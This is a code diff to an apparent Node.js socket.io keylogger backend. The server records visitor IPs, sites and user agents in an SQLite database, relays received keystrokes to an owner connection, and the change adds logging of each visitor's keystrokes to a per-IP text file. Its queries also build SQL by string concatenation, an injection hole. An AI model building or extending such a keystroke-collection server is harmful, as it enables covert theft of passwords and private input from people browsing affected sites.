@@ -7,6 +7,7 @@ var ex = false;
 var ownerSocket ;
 var toret = [];
 //sql
+var fs = require('fs');
 var db = new sqlite.Database('blacksails_db');
 db.serialize(function(){
 	db.run("CREATE TABLE IF NOT EXISTS users (ID INTEGER PRIMARY KEY AUTOINCREMENT,IP TEXT NOT NULL,TIME TEXT NOT NULL,STATUS TEXT NOT NULL,LASTLOGIN TEXT NOT NULL,FIRSTLOGIN TEXT NOT NULL,SITEWEB TEXT NOT NULL,AGENT TEXT NOT NULL)");
@@ -64,7 +65,13 @@ io.sockets.on('connection',function(socket){
 	io.sockets.emit('getinfo',data);
 	});
 	socket.on('keyp',function(data){
-	io.sockets.emit('getkey',{key:data,id:socket.request.connection.remoteAddress.replace(":","")});
+			var iptemp =  socket.request.connection.remoteAddress.replace(':','');
+	 iptemp =  iptemp.replace(':','');
+	io.sockets.emit('getkey',{key:data,id:iptemp});
+
+	fs.appendFile(iptemp+'.txt', data , function(err) {
+    
+    });
 	});
 
 	
@@ -76,7 +83,9 @@ function ConnectUser(socket)
 	ownerSocket =socket;
 	connections[socket['id']] = socket;
 		db.serialize(function(){
-	var iptemp =  socket.request.connection.remoteAddress;
+
+	var iptemp =  socket.request.connection.remoteAddress.replace(':','');
+	 iptemp =  iptemp.replace(':','');
 	
 		db.get("select * from users where IP = '"+iptemp+"' ",function(err,row){
 		
@@ -104,7 +113,8 @@ function DisconnectUser(socket)
 		db.serialize(function(){
 		
 
-	var iptemp =  socket.request.connection.remoteAddress;
+	var iptemp =  socket.request.connection.remoteAddress.replace(':','');
+	 iptemp =  iptemp.replace(':','');
 	
 		db.get("select * from users where IP = '"+iptemp+"' ",function(err,row){
 		
